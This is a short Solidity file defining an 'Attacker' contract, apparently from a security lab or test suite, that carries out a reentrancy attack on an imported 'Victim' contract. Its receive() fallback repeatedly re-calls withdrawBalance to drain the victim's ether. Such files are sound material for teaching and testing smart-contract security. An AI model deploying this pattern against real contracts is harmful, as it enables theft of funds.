// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Victim} from "src/Victim.sol";

contract Attacker {
    Victim victim;

    constructor(Victim _victim) {
        victim = _victim;
    }

    function attack() public payable {
        victim.deposit{value: 1 ether}();
        victim.withdrawBalance();
    }

    receive() external payable {
        if (address(victim).balance >= 1 ether) {
            victim.withdrawBalance();
        }
    }
}